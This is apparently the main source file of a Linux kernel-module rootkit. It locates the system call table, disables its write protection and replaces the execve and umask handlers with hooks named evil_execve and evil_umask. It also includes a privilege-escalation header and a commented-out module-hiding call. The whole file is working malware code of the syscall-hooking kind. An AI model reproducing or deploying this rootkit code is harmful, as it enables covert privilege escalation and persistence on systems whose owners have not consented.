#include "utils.h"
#include "core.h"
#include "syscall_lib.h"
#include "sys_escalation.h"

/* load the LKM */
static int __init module_t_load(void)
{
  /* do the hiding process */
  // do_hide_module();

  /* retrieve the system call table address */
  table_ptr = sys_call_table_retrieve();

  /* set pointers to origin syscalls */
  def_execve = table_ptr[__NR_execve];
  def_umask = table_ptr[__NR_umask];

  /* set the system call table writeable */
  set_sct_rw(table_ptr);

  /* hook execve and umask syscalls */
  table_ptr[__NR_execve] = evil_execve;
  table_ptr[__NR_umask] = evil_umask;

  /* set the system call table write protected */
  set_sct_ro(table_ptr);

  /* only for debug reasons */
  debug_print("Syscall table retrieved: %p", table_ptr);
  
  return 0;
}

/* unload the LKM */
static void __exit module_t_unload(void)
{
  /* set the system call table writeable */
  set_sct_rw(table_ptr);

  /* rewrite the original syscall addresses */
  table_ptr[__NR_execve] = def_execve;
  table_ptr[__NR_umask] = def_umask;

  /* set the system call table write protected */
  set_sct_ro(table_ptr);

}

module_init(module_t_load);
module_exit(module_t_unload);
